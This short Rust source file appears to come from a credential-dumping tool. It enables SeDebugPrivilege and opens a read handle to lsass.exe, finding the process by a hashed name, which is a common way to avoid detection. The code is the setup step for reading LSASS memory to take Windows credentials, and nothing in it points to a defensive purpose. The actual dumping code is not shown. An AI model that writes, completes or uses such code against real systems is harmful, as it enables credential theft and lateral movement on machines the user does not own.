use alloc::vec::Vec;
use core::ffi::c_void;

use crate::{
    native::{
        ntdef::{PROCESS_QUERY_INFORMATION, PROCESS_VM_READ},
        ntpsapi::{enable_se_debug_privilege, get_process_handle_by_name},
    },
};

/// Enables SeDebugPrivilege for the process.
/// This is necessary to access system processes like `lsass.exe`.
pub fn initialize_privileges() -> i32 {
    unsafe { enable_se_debug_privilege() }
}

/// Retrieves a handle to the `lsass.exe` process using its DBJ2 hash.
/// Returns a handle to the process if successful.
pub fn get_process_handle() -> *mut c_void {
    unsafe { get_process_handle_by_name(0x7384117b, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ) }
}

